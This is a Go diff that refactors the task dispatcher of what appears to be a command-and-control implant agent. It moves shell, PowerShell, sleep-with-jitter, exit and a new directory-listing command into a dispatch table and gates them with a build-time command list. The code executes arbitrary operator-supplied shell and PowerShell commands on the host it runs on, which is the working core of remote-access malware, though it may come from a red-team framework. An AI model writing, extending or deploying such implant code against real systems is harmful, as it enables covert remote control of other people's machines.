@@ -11,40 +11,120 @@ import (
 	"time"
 )
 
+// commandEntry is one row of the dispatch table. To add a command, add a
+// row plus a handler here, register it in the container commandSpecs and
+// add it to the C table in agent_code_c/tasks.c.
+type commandEntry struct {
+	name string
+	run  func(a *Agent, arg string) (output, status string, exit bool)
+}
+
+var commandTable = []commandEntry{
+	{name: "shell", run: handleShell},
+	{name: "powershell", run: handlePowershell},
+	{name: "sleep", run: handleSleep},
+	{name: "ls", run: handleLs},
+	{name: "exit", run: handleExit},
+}
+
 // dispatch runs one task and reports whether the agent must exit afterwards.
 func (a *Agent) dispatch(t Task) (Response, bool) {
 	resp := Response{TaskID: t.ID, Completed: true, Status: "success"}
-	arg := taskArg(t.Parameters)
-	switch t.Command {
-	case "shell":
-		out, err := runShell(arg)
-		resp.UserOutput = out
-		if err != nil {
-			resp.Status = "error: " + err.Error()
-		}
-	case "powershell":
-		out, err := runPowershell(arg)
-		resp.UserOutput = out
-		if err != nil {
-			resp.Status = "error: " + err.Error()
-		}
-	case "sleep":
-		interval, jitter, err := parseSleep(arg)
-		if err != nil {
-			resp.Status = "error: " + err.Error()
-			resp.UserOutput = err.Error()
-			return resp, false
-		}
-		a.interval, a.jitter = interval, jitter
-		resp.UserOutput = fmt.Sprintf("sleep set to %ds jitter %d%%", interval, jitter)
-	case "exit":
-		resp.UserOutput = "exiting"
-		return resp, true
-	default:
+	entry := findCommand(t.Command)
+	if entry == nil {
 		resp.Status = "error: unknown command " + t.Command
 		resp.UserOutput = resp.Status
+		return resp, false
 	}
-	return resp, false
+	if !commandAllowed(t.Command) {
+		resp.Status = "error: command " + t.Command + " not included in this build"
+		resp.UserOutput = resp.Status
+		return resp, false
+	}
+	out, status, exit := entry.run(a, taskArg(t.Parameters))
+	resp.UserOutput, resp.Status = out, status
+	return resp, exit
+}
+
+func findCommand(name string) *commandEntry {
+	for i := range commandTable {
+		if commandTable[i].name == name {
+			return &commandTable[i]
+		}
+	}
+	return nil
+}
+
+// commandAllowed reports whether name is in the build-time command list.
+// An empty list (offline builds without -X) allows everything.
+func commandAllowed(name string) bool {
+	if strings.TrimSpace(includedCommands) == "" {
+		return true
+	}
+	for _, c := range strings.Split(includedCommands, ",") {
+		if strings.TrimSpace(c) == name {
+			return true
+		}
+	}
+	return false
+}
+
+func handleShell(_ *Agent, arg string) (string, string, bool) {
+	out, err := runShell(arg)
+	if err != nil {
+		return out, "error: " + err.Error(), false
+	}
+	return out, "success", false
+}
+
+func handlePowershell(_ *Agent, arg string) (string, string, bool) {
+	out, err := runPowershell(arg)
+	if err != nil {
+		return out, "error: " + err.Error(), false
+	}
+	return out, "success", false
+}
+
+func handleSleep(a *Agent, arg string) (string, string, bool) {
+	interval, jitter, err := parseSleep(arg)
+	if err != nil {
+		return err.Error(), "error: " + err.Error(), false
+	}
+	a.interval, a.jitter = interval, jitter
+	return fmt.Sprintf("sleep set to %ds jitter %d%%", interval, jitter), "success", false
+}
+
+func handleLs(_ *Agent, arg string) (string, string, bool) {
+	out, err := runLs(arg)
+	if err != nil {
+		return "", "error: " + err.Error(), false
+	}
+	return out, "success", false
+}
+
+func handleExit(_ *Agent, _ string) (string, string, bool) {
+	return "exiting", "success", true
+}
+
+// runLs lists one directory, one entry per line ("name/" for subdirs).
+func runLs(arg string) (string, error) {
+	dir := strings.TrimSpace(arg)
+	if dir == "" {
+		dir = "."
+	}
+	entries, err := os.ReadDir(dir)
+	if err != nil {
+		return "", err
+	}
+	var b strings.Builder
+	for _, e := range entries {
+		b.WriteString(e.Name())
+		if e.IsDir() {
+			b.WriteString("/")
+		}
+		b.WriteString("\n")
+	}
+	return b.String(), nil
 }
 
 func runShell(arg string) (string, error) {
